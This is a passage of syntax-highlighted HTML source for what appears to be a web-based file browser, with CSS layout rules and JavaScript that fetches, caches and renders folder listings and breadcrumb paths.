class="language-css">            <span class="attribute">width</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.header-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            -moz-user-select: none;</span></span><br><span class="line"><span class="language-css">            -o-user-select: none;</span></span><br><span class="line"><span class="language-css">            -khtml-user-select: none;</span></span><br><span class="line"><span class="language-css">            -webkit-user-select: none;</span></span><br><span class="line"><span class="language-css">            -ms-user-select: none;</span></span><br><span class="line"><span class="language-css">            user-select: none;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">1.8em</span> <span class="number">0</span> <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: solid <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>) <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.logo</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-right</span>: .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.site</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* margin-left: auto;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">                padding-left: 2em; */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-overflow</span>: ellipsis;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav-path</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav-arr</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">1.5em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-right</span>: .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-overflow</span>: ellipsis;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: default;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#main-page</span><span class="selector-pseudo">:hover</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav-path</span><span class="selector-pseudo">:hover</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.tree-node</span><span class="selector-pseudo">:hover</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.row</span><span class="selector-class">.file-wrapper</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">90</span>, <span class="number">101</span>, <span class="number">133</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">3em</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.main</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline-grid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">20%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: .<span class="number">8em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: scroll;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.tree-node-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: <span class="number">1.5em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.tree-node</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.tree-node-name</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">80%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: <span class="number">20%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: scroll;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.row</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">2.5em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span> .<span class="number">8em</span> <span class="number">0</span> <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: solid <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>) <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.row</span><span class="selector-class">.file-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: .<span class="number">8em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.file</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.name</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-overflow</span>: ellipsis;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">70%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding-left</span>: .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.list-header</span> <span class="selector-class">.name</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">70%</span> + <span class="number">1.1em</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding-left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.time</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-overflow</span>: ellipsis;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: right;</span></span><br><span class="line"><span class="language-css">            ;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">133px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.size</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-overflow</span>: ellipsis;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1000px</span>) &#123;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin-left</span>: initial;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">800px</span>) &#123;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.name</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">60%</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.list-header</span> <span class="selector-class">.name</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">60%</span> + <span class="number">1.1em</span>);</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.file-name</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">overflow-x</span>: scroll;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">600px</span>) &#123;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.name</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">75%</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.time</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">0</span> .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.row</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">0</span> .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.row</span><span class="selector-class">.file-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">0</span> .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.markdown-body</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: .<span class="number">6em</span> .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.file-name</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">1em</span> .<span class="number">3em</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">0</span> .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.btn</span><span class="selector-class">.download</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin-right</span>: .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.logo</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">createCORSRequest</span>(<span class="params">method, url, timeout</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="string">&#x27;withCredentials&#x27;</span> <span class="keyword">in</span> xhr) &#123;</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">open</span>(method, url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="title class_">XDomainRequest</span> !== <span class="string">&#x27;undefined&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                xhr = <span class="keyword">new</span> <span class="title class_">XDomainRequest</span>();</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">open</span>(method, url);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                xhr = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (xhr) &#123;</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="property">timeout</span> = timeout;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> xhr;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">sendRequest</span>(<span class="params">method, url, data, headers, callback, error, times</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> xhr = <span class="title function_">createCORSRequest</span>(method, url, <span class="number">2500</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">onreadystatechange</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">callback</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">timeout</span> = xhr.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (!times) &#123;</span></span><br><span class="line"><span class="language-javascript">                    times = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">url</span>: url,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">data</span>: data,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">times</span>: times</span></span><br><span class="line"><span class="language-javascript">                &#125;)</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (times &lt; <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">sendRequest</span>(method, url, data, headers, callback, error, times + <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> error === <span class="string">&#x27;function&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">error</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (headers) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (key <span class="keyword">in</span> headers) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (headers.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span></span><br><span class="line"><span class="language-javascript">                        xhr.<span class="title function_">setRequestHeader</span>(key, headers[key]);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data) &#123;</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">send</span>(data);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">renderPage</span>(<span class="params">data, cache</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> files;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data) &#123;</span></span><br><span class="line"><span class="language-javascript">                files = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(files.<span class="property">parent</span>, files);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">preCache</span>(files, <span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                files = cache;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (files.<span class="property">parent</span> === <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">renderPath</span>(files.<span class="property">parent</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (files.<span class="property">encrypted</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">handleEncryptedFolder</span>(files);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">renderFileList</span>(files);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">renderTreeNode</span>(files);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;hidden&#x27;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeAttribute</span>(<span class="string">&#x27;hidden&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.loading-wrapper&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">renderPath</span>(<span class="params">path</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> <span class="title function_">createPathSpan</span> = (<span class="params">text, path</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> pathSpan = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                pathSpan.<span class="property">innerHTML</span> = text.<span class="property">length</span> &gt; <span class="number">20</span> ? text.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">20</span>) + <span class="string">&#x27;..&#x27;</span> : text;</span></span><br><span class="line"><span class="language-javascript">                pathSpan.<span class="property">className</span> = text === <span class="string">&#x27;/&#x27;</span> ? <span class="string">&#x27;nav-arr&#x27;</span> : <span class="string">&#x27;nav-path&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (path) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">addPathListener</span>(pathSpan, path);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> pathSpan;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> paths = path.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> pathSpanWrapper = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;path&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            pathSpanWrapper.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            pathSpanWrapper.<span class="title function_">appendChild</span>(<span class="title function_">createPathSpan</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>));</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> continualPath = <span class="string">&#x27;/&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; paths.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                continualPath += paths[i];</span></span><br><span class="line"><span class="language-javascript">                pathSpanWrapper.<span class="title function_">appendChild</span>(<span class="title function_">createPathSpan</span>(paths[i], continualPath));</span></span><br><span class="line"><span class="language-javascript">                pathSpanWrapper.<span class="title function_">appendChild</span>(<span class="title function_">createPathSpan</span>(<span class="string">&#x27;/&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">                continualPath += <span class="string">&#x27;/&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            pathSpanWrapper.<span class="title function_">appendChild</span>(<span class="title function_">createPathSpan</span>(paths[paths.<span class="property">length</span> - <span class="number">1</span>]));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">renderFileList</span>(<span class="params">files</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">switchRightDisplay</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> <span class="title function_">createFileWrapper</span> = (<span class="params">type, name, time, size, path, url</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> fileWrapper = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;file-wrapper-templete&#x27;</span>).<span class="property">content</span>.<span class="title function_">cloneNode</span>(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                fileWrapper.<span class="title function_">querySelector</span>(<span class="string">&#x27;ion-icon&#x27;</span>).<span class="title function_">setAttribute</span>(<span class="string">&#x27;name&#x27;</span>, type);</span></span><br><span class="line"><span class="language-javascript">                fileWrapper.<span class="title function_">querySelector</span>(<span class="string">&#x27;.name&#x27;</span>).<span class="property">innerHTML</span> = name;</span></span><br><span class="line"><span class="language-javascript">                fileWrapper.<span class="title 